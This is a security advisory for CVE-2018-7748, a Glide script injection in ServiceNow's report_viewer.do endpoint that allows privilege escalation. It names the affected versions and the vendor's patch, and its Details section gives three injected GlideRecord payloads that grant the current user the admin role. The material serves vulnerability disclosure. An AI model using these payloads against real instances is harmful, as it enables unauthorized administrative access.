Advisory: ServiceNow Glide Scripting Injection leading to Privilege Escalation
Release Date: 2018/03/15
Author: Robin Verton (robin.verton@telekom.de)
CVE: CVE-2018-7748
Application: ServiceNow <= Release 'Jakarta' Patch 8
Risk: Critical
Vendor Status: 'Jakarta' Patch 8a was released to fix this vulnerability.
Overview:
"The Now Platform delivers a System of Action for the enterprise. Using a
single data model, it’s easy to create contextual workflows and automate any
business process. Anyone, from the business user to the professional
developer, can easily build applications at lightspeed.
Any application user on the Now Platform can make requests through service
catalogs, find information in common knowledge bases, and be notified about
the actions and information they care about the most."[1]
Details:
The /report\_viewer.do endpoint is prone to a glide script injection
vulnerability. It is possible to inject glide code (scripting language) by
submitting a string in the format '${xyz}' in the sysparm\_media parameter. To
successfully exploit this, an authenticated user is required and any valid
report id. The following steps will escalate the current user privileges to
the 'admin' role. This is possible by doing three GlideRecord actions to query
the database:
a) Get the current users sys\_id.
${gs.getUserID()}
b) Get the sys\_id for the admin role.
${u=new GlideRecord("sys\_user\_role");u.addQuery("name","admin");
u.query();u.next();u.getValue("sys\_id")}
c) Add admin role from (b) to own record.
${gr=new GlideRecord("sys\_user\_has\_role");gr.initialize();
gr.user="";gr.role="";gr.insert();}
This is only one example of what could be injected, leading to the highest
available permissions. A lot of different things can be done by injection of
Glide code.
